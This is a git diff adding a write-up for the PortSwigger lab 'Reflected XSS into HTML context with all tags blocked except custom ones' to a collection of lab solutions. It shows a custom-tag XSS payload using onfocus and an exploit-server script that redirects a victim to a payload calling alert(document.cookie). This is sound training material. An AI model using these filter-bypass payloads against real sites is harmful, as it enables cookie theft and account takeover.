@@ -18,6 +18,7 @@
 - [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
 - [Exploiting XSS to perform CSRF](#exploiting-xss-to-perform-csrf)
 - [Reflected XSS into HTML context with most tags and attributes blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
+- [Reflected XSS into HTML context with all tags blocked except custom ones](#reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -276,3 +277,25 @@ There is a *WAF* to protect the website from XSS. This firewall blocks HTML tags
 <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 15. Click "Store" and "Deliver exploit to victim".
+
+## Reflected XSS into HTML context with all tags blocked except custom ones
+Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
+
+<!-- omit in toc -->
+### Quick Solution
+This lab blocks **every** HTML tag except custom ones. Looking at the **cheatsheet** there are some payloads that can be used, here is the one that uses only custom tags and is compatible with every browser except Firefox:
+```
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+```
+To automatically trigger the payload on page load add ``#x``. Even though this payload is not compatible with *Firefox* the lab will be marked as solved (the target browser is probably *Chrome*).
+
+<!-- omit in toc -->
+### Solution
+1. Go to the exploit server and paste the following code, replacing ``your-lab-id`` with your lab ID:
+```javascript
+<script>
+location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+2. Click "Store" and "Deliver exploit to victim".
+This injection creates a custom tag with the ID ``x``, which contains an ``onfocus`` event handler that triggers the ``alert`` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the ``alert`` payload to be called.
